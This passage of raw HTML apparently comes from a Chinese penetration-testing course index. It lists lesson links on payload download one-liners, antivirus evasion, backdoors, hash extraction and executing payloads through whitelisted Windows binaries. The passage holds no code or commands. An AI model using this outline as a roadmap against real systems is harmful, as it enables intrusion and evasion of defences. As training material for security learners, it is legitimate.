href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8DVeil-Evasion%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx">11.工具介绍Veil-Evasion</a></h3><h3 id="12-基于UDP发现内网存活主机"><a href="#12-基于UDP发现内网存活主机" class="headerlink" title="12.基于UDP发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8EUDP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">12.基于UDP发现内网存活主机</a></h3><h3 id="13-基于ARP发现内网存活主机"><a href="#13-基于ARP发现内网存活主机" class="headerlink" title="13.基于ARP发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8EARP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx">13.基于ARP发现内网存活主机</a></h3><h3 id="14-基于第十课补充payload1"><a href="#14-基于第十课补充payload1" class="headerlink" title="14.基于第十课补充payload1"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload1%EF%BC%88%E7%AC%AC%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">14.基于第十课补充payload1</a></h3><h3 id="15-基于第十课补充payload2"><a href="#15-基于第十课补充payload2" class="headerlink" title="15.基于第十课补充payload2"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload2%EF%BC%88%E7%AC%AC%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">15.基于第十课补充payload2</a></h3><h3 id="16-红蓝对抗渗透测试1"><a href="#16-红蓝对抗渗透测试1" class="headerlink" title="16.红蓝对抗渗透测试1"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951%EF%BC%88%E7%AC%AC%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">16.红蓝对抗渗透测试1</a></h3><h3 id="17-红蓝对抗渗透测试2"><a href="#17-红蓝对抗渗透测试2" class="headerlink" title="17.红蓝对抗渗透测试2"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">17.红蓝对抗渗透测试2</a></h3><h3 id="18-红蓝对抗渗透测试3"><a href="#18-红蓝对抗渗透测试3" class="headerlink" title="18.红蓝对抗渗透测试3"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%AC%AC%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%9A%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%953.docx">18.红蓝对抗渗透测试3</a></h3><h3 id="19-基于netbios发现内网存活主机"><a href="#19-基于netbios发现内网存活主机" class="headerlink" title="19.基于netbios发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8Enetbios%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">19.基于netbios发现内网存活主机</a></h3><h3 id="20-基于snmp发现内网存活主机"><a href="#20-基于snmp发现内网存活主机" class="headerlink" title="20.基于snmp发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8Esnmp%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%8D%81%E8%AF%BE%EF%BC%89.docx">20.基于snmp发现内网存活主机</a></h3><h3 id="31-msf的前生今世"><a href="#31-msf的前生今世" class="headerlink" title="31.msf的前生今世"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/msf%E7%9A%84%E5%89%8D%E7%94%9F%E4%BB%8A%E4%B8%96%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx">31.msf的前生今世</a></h3><h3 id="32-配置vps上的msf"><a href="#32-配置vps上的msf" class="headerlink" title="32.配置vps上的msf"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%85%8D%E7%BD%AEvps%E4%B8%8A%E7%9A%84msf%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">32.配置vps上的msf</a></h3><h3 id="33-攻击Mysql服务"><a href="#33-攻击Mysql服务" class="headerlink" title="33.攻击Mysql服务"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%94%BB%E5%87%BBMysql%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx">33.攻击Mysql服务</a></h3><h3 id="34-攻击Sql-server-服务"><a href="#34-攻击Sql-server-服务" class="headerlink" title="34.攻击Sql server 服务"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%94%BB%E5%87%BBSql%20server%20%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">34.攻击Sql server 服务</a></h3><h3 id="35-与Sqlmap结合攻击"><a href="#35-与Sqlmap结合攻击" class="headerlink" title="35.与Sqlmap结合攻击"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E4%B8%8ESqlmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">35.与Sqlmap结合攻击</a></h3><h3 id="36-解决vps上ssh掉线"><a href="#36-解决vps上ssh掉线" class="headerlink" title="36.解决vps上ssh掉线"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E8%A7%A3%E5%86%B3vps%E4%B8%8Assh%E6%8E%89%E7%BA%BF%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">36.解决vps上ssh掉线</a></h3><h3 id="37-vbs一句话下载payload"><a href="#37-vbs一句话下载payload" class="headerlink" title="37.vbs一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">37.vbs一句话下载payload</a></h3><h3 id="38-certutil一句话下载payload"><a href="#38-certutil一句话下载payload" class="headerlink" title="38.certutil一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/certutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.docx">38.certutil一句话下载payload</a></h3><h3 id="39-vbs一句话下载payload补充"><a href="#39-vbs一句话下载payload补充" class="headerlink" title="39.vbs一句话下载payload补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85%EF%BC%88%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">39.vbs一句话下载payload补充</a></h3><h3 id="40-ftp一句话下载payload"><a href="#40-ftp一句话下载payload" class="headerlink" title="40.ftp一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E8%AF%BE%EF%BC%89.docx">40.ftp一句话下载payload</a></h3><h3 id="41-bitsadmin一句话下载payload"><a href="#41-bitsadmin一句话下载payload" class="headerlink" title=" 41.bitsadmin一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/bitsadmin%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx"> 41.bitsadmin一句话下载payload</a></h3><h3 id="42-攻击FTP-服务"><a href="#42-攻击FTP-服务" class="headerlink" title="42.攻击FTP 服务"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%94%BB%E5%87%BBFTP%20%E6%9C%8D%E5%8A%A1%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89.docx">42.攻击FTP 服务</a></h3><h3 id="43-js一句话下载payload"><a href="#43-js一句话下载payload" class="headerlink" title=" 43.js一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/js%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx"> 43.js一句话下载payload</a></h3><h3 id="44-ertutil一句话下载payload补充"><a href="#44-ertutil一句话下载payload补充" class="headerlink" title="44.ertutil一句话下载payload补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/ertutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">44.ertutil一句话下载payload补充</a></h3><h3 id="45-解决bat一句话下载payload黑窗"><a href="#45-解决bat一句话下载payload黑窗" class="headerlink" title="45.解决bat一句话下载payload黑窗"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E8%A7%A3%E5%86%B3bat%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E9%BB%91%E7%AA%97%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">45.解决bat一句话下载payload黑窗</a></h3><h3 id="46-powershell一句话下载payload"><a href="#46-powershell一句话下载payload" class="headerlink" title="46.powershell一句话下载payload"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/powershell%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">46.powershell一句话下载payload</a></h3><h3 id="47-payload分离免杀思路"><a href="#47-payload分离免杀思路" class="headerlink" title="47.payload分离免杀思路"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">47.payload分离免杀思路</a></h3><h3 id="48-payload分离免杀思路第二季"><a href="#48-payload分离免杀思路第二季" class="headerlink" title="48.payload分离免杀思路第二季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.docx">48.payload分离免杀思路第二季</a></h3><h3 id="49-关于Powershell对抗安全软件"><a href="#49-关于Powershell对抗安全软件" class="headerlink" title="49.关于Powershell对抗安全软件"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%85%B3%E4%BA%8EPowershell%E5%AF%B9%E6%8A%97%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">49.关于Powershell对抗安全软件</a></h3><h3 id="50-基于SqlDataSourceEnumerator发现内网存活主机"><a href="#50-基于SqlDataSourceEnumerator发现内网存活主机" class="headerlink" title="50.基于SqlDataSourceEnumerator发现内网存活主机"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8ESqlDataSourceEnumerator%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E8%AF%BE%EF%BC%89%EF%BC%89.docx">50.基于SqlDataSourceEnumerator发现内网存活主机</a></h3><h3 id="51-项目回忆：体系的本质是知识点串联"><a href="#51-项目回忆：体系的本质是知识点串联" class="headerlink" title="51.项目回忆：体系的本质是知识点串联"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%A1%B9%E7%9B%AE%E5%9B%9E%E5%BF%86%EF%BC%9A%E4%BD%93%E7%B3%BB%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%B2%E8%81%94%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%89.docx">51.项目回忆：体系的本质是知识点串联</a></h3><h3 id="52-渗透的本质是信息搜集"><a href="#52-渗透的本质是信息搜集" class="headerlink" title="52.渗透的本质是信息搜集"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%89%EF%BC%89.docx">52.渗透的本质是信息搜集</a></h3><h3 id="53-内网渗透中的文件传输"><a href="#53-内网渗透中的文件传输" class="headerlink" title="53.内网渗透中的文件传输"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%89.docx">53.内网渗透中的文件传输</a></h3><h3 id="54-基于Powershell做Socks-4-5代理"><a href="#54-基于Powershell做Socks-4-5代理" class="headerlink" title="54.基于Powershell做Socks 4-5代理"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E5%9F%BA%E4%BA%8EPowershell%E5%81%9ASocks%204-5%E4%BB%A3%E7%90%86%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%89.docx">54.基于Powershell做Socks 4-5代理</a></h3><h3 id="55-与Smbmap结合攻击"><a href="#55-与Smbmap结合攻击" class="headerlink" title="55.与Smbmap结合攻击"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E4%B8%8ESmbmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%89.docx">55.与Smbmap结合攻击</a></h3><h3 id="56-离线提取目标机hash"><a href="#56-离线提取目标机hash" class="headerlink" title="56.离线提取目标机hash"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%89.docx">56.离线提取目标机hash</a></h3><h3 id="57-高级持续渗透-第一季关于后门"><a href="#57-高级持续渗透-第一季关于后门" class="headerlink" title="57.高级持续渗透-第一季关于后门"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%80%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%89.docx">57.高级持续渗透-第一季关于后门</a></h3><h3 id="58-高级持续渗透-第二季关于后门补充一"><a href="#58-高级持续渗透-第二季关于后门补充一" class="headerlink" title="58.高级持续渗透-第二季关于后门补充一"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%8C%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%B8%80%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.docx">58.高级持续渗透-第二季关于后门补充一</a></h3><h3 id="59-高级持续渗透-第三季关于后门补充二"><a href="#59-高级持续渗透-第三季关于后门补充二" class="headerlink" title="59.高级持续渗透-第三季关于后门补充二"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%89%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%E8%A1%A5%E5%85%85%E4%BA%8C%EF%BC%88%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%89.docx">59.高级持续渗透-第三季关于后门补充二</a></h3><h3 id="60-高级持续渗透-第四季关于后门"><a href="#60-高级持续渗透-第四季关于后门" class="headerlink" title="60.高级持续渗透-第四季关于后门"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%9B%9B%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8%EF%BC%88%E7%AC%AC%E5%85%AD%E5%8D%81%E8%AF%BE%EF%BC%89.docx">60.高级持续渗透-第四季关于后门</a></h3><h3 id="61-高级持续渗透-第五季关于后门"><a href="#61-高级持续渗透-第五季关于后门" class="headerlink" title="61.高级持续渗透-第五季关于后门"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%BA%94%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.docx">61.高级持续渗透-第五季关于后门</a></h3><h3 id="62-高级持续渗透-第六季关于后门"><a href="#62-高级持续渗透-第六季关于后门" class="headerlink" title="62.高级持续渗透-第六季关于后门"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AD%E5%AD%A3%E5%85%B3%E4%BA%8E%E5%90%8E%E9%97%A8.docx">62.高级持续渗透-第六季关于后门</a></h3><h3 id="63-高级持续渗透-第七季demo的成长"><a href="#63-高级持续渗透-第七季demo的成长" class="headerlink" title="63.高级持续渗透-第七季demo的成长"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E4%B8%83%E5%AD%A3demo%E7%9A%84%E6%88%90%E9%95%BF.docx">63.高级持续渗透-第七季demo的成长</a></h3><h3 id="64-高级持续渗透-第八季demo便是远控"><a href="#64-高级持续渗透-第八季demo便是远控" class="headerlink" title="64.高级持续渗透-第八季demo便是远控"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%9A%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F-%E7%AC%AC%E5%85%AB%E5%AD%A3demo%E4%BE%BF%E6%98%AF%E8%BF%9C%E6%8E%A7.docx">64.高级持续渗透-第八季demo便是远控</a></h3><h3 id="65-离线提取目标机hash补充"><a href="#65-离线提取目标机hash补充" class="headerlink" title="65.离线提取目标机hash补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/61-65/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%BA%94%E8%AF%BE%EF%BC%9A%E7%A6%BB%E7%BA%BF%E6%8F%90%E5%8F%96%E7%9B%AE%E6%A0%87%E6%9C%BAhash%E8%A1%A5%E5%85%85.docx">65.离线提取目标机hash补充</a></h3><h3 id="66-借助aspx对payload进行分离免杀"><a href="#66-借助aspx对payload进行分离免杀" class="headerlink" title="66.借助aspx对payload进行分离免杀"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%AD%E8%AF%BE%EF%BC%9A%E5%80%9F%E5%8A%A9aspx%E5%AF%B9payload%E8%BF%9B%E8%A1%8C%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80.docx">66.借助aspx对payload进行分离免杀</a></h3><h3 id="67-meterpreter下的irb操作第一季"><a href="#67-meterpreter下的irb操作第一季" class="headerlink" title="67.meterpreter下的irb操作第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%83%E8%AF%BE%EF%BC%9Ameterpreter%E4%B8%8B%E7%9A%84irb%E6%93%8D%E4%BD%9C%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">67.meterpreter下的irb操作第一季</a></h3><h3 id="68-基于Ruby内存加载shellcode第一季"><a href="#68-基于Ruby内存加载shellcode第一季" class="headerlink" title="68.基于Ruby内存加载shellcode第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8ERuby%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDshellcode%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">68.基于Ruby内存加载shellcode第一季</a></h3><h3 id="69-渗透，持续渗透，后渗透的本质"><a href="#69-渗透，持续渗透，后渗透的本质" class="headerlink" title="69.渗透，持续渗透，后渗透的本质"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B9%9D%E8%AF%BE%EF%BC%9A%E6%B8%97%E9%80%8F%EF%BC%8C%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F%EF%BC%8C%E5%90%8E%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8.docx">69.渗透，持续渗透，后渗透的本质</a></h3><h3 id="70-ftp一句话下载payload补充"><a href="#70-ftp一句话下载payload补充" class="headerlink" title="70.ftp一句话下载payload补充"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/66-70/%E7%AC%AC%E4%B8%83%E5%8D%81%E8%AF%BE%EF%BC%9Aftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85.docx">70.ftp一句话下载payload补充</a></h3><h3 id="71-基于白名单Msbuild-exe执行payload第一季"><a href="#71-基于白名单Msbuild-exe执行payload第一季" class="headerlink" title="71.基于白名单Msbuild.exe执行payload第一季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B8%80%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%80%E5%AD%A3.docx">71.基于白名单Msbuild.exe执行payload第一季</a></h3><h3 id="72-基于白名单Installutil-exe执行payload第二季"><a href="#72-基于白名单Installutil-exe执行payload第二季" class="headerlink" title="72.基于白名单Installutil.exe执行payload第二季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%BA%8C%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3.docx">72.基于白名单Installutil.exe执行payload第二季</a></h3><h3 id="73-基于白名单Regasm-exe执行payload第三季"><a href="#73-基于白名单Regasm-exe执行payload第三季" class="headerlink" title="73.基于白名单Regasm.exe执行payload第三季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E4%B8%89%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%89%E5%AD%A3.docx">73.基于白名单Regasm.exe执行payload第三季</a></h3><h3 id="74-基于白名单regsvcs-exe执行payload第四季"><a href="#74-基于白名单regsvcs-exe执行payload第四季" class="headerlink" title="74.基于白名单regsvcs.exe执行payload第四季"></a><a href="https://edu.heibai.org/APT%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/71-74/%E7%AC%AC%E4%B8%83%E5%8D%81%E5%9B%9B%E8%AF%BE%EF%BC%9A%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95regsvcs.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%9B%9B%E5%AD%A3.docx">74.基于白名单regsvcs.exe执行payload第四季</a></h3><h3 id="75-基于白名单Mshta-exe执行payload第五季"><a href="#75-基于白名单Mshta-exe执行payload第五季" 